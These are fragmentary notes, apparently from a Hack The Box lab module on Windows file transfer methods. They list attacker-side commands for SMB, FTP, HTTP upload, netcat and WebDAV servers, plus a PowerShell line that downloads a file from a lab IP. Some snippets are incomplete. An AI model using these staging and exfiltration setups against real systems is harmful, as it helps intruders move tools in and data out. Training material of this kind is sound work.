...
```shell-session
JackTheWizard@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
...
```shell-session
JackTheWizard@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
...
```shell-session
JackTheWizard@htb[/htb]$ sudo pip3 install pyftpdlib
```
...
```shell-session
JackTheWizard@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
...
```
(New-Object Net.WebClient).DownloadFile('ftp://10.10.14.203/upload_win.zip', 'C:\Users\Public\upload_win.zip')
...
```shell-session
JackTheWizard@htb[/htb]$ echo  | base64 -d > hosts
```

  Windows File Transfer Methods

```shell-session
JackTheWizard@htb[/htb]$ md5sum hosts 
...
```shell-session
JackTheWizard@htb[/htb]$ pip3 install uploadserver
...
```shell-session
JackTheWizard@htb[/htb]$ python3 -m uploadserver
...
```shell-session
JackTheWizard@htb[/htb]$ nc -lvnp 8000
...
```shell-session
JackTheWizard@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```
...
```shell-session
JackTheWizard@htb[/htb]$ sudo pip3 install wsgidav cheroot
...
```shell-session
JackTheWizard@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
...
```shell-session
JackTheWizard@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
